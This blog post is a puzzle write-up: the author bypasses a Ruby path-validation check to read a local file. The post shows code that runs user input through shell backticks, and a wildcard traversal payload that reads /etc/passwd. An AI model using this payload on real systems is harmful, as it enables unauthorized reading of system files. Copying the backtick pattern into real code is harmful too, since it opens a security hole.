---
layout: post
title: "Challenge Accepted: Local File Inclusion"
date: 2013-12-09 08:18
comments: true
categories: Challenge, Security, Local File Inclusion
---

This morning I woke up to some unfriendly ice rain, and the snow covered sidewalk has turned into an ice-skating rink.  Baby steps were necessary to avoid ending up in a horizontal position unvolunerily.  I made it to the train station safely, and got on the NYC-bound train.
On the bright side, Egor Homakov (@homakov) posted a challenge on Twitter for finding the local file inclusion security hole in a piece of path validation code.

```ruby
input = 'sub/dir/ectory'
input = input.strip
 
raise 'NO WAI' if input[0] == '/'
 
if input.split('/').any?{|folder| !(folder =~ /\A[a-zA-Z*.]+\z/) or folder == '..' }
puts 'Error'
else
puts `cat #{input}`
end
```

Looks like my 40 minute train ride has turned into a hacking session and I eagerly played around with the provided code to access the contents of my local `etc/passwd` file. Eureka! Finally, I figured out that by breaking up `..` (parent directory) with the wildcard `*`, I could trick the validation code into allowing my path string. Also, in `bash` the folder `.*.` behaves the same as `..`, so by prepending `etc/passwd` with the right number of `.*./` strings, I could finally access the coveted password file.

``` ruby
# Note: This path gives me the passwd file contents on my local system
input = '.*./.*./.*./.*./.*./etc/passwd'
 
input = input.strip
 
raise 'NO WAI' if input[0] == '/'
 
if input.split('/').any?{|folder| !(folder =~ /\A[a-zA-Z*.]+\z/) or folder == '..' }
puts 'Error'
else
puts `cat #{input}`
end
```